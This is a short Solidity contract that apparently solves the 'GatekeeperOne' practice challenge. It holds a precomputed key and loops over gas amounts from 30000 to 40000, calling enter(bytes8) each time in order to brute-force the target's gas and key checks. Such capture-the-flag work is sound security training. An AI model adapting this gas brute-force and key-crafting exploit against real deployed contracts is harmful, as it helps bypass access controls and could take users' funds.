// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GateKeeperOne.sol";

contract Test {
    GatekeeperOne public gatekeeperOne;
    bytes8 private key = 0x100000000000f7c3;

    constructor(address addr) public {
        gatekeeperOne = GatekeeperOne(addr);
    }

    function forwardTransaction() public {
        for (uint256 i = 30000; i < 40000; ++i) {
            (bool sent, bytes memory data) = address(gatekeeperOne).call{
                gas: i
            }(abi.encodeWithSignature("enter(bytes8)", key));
        }
    }
}
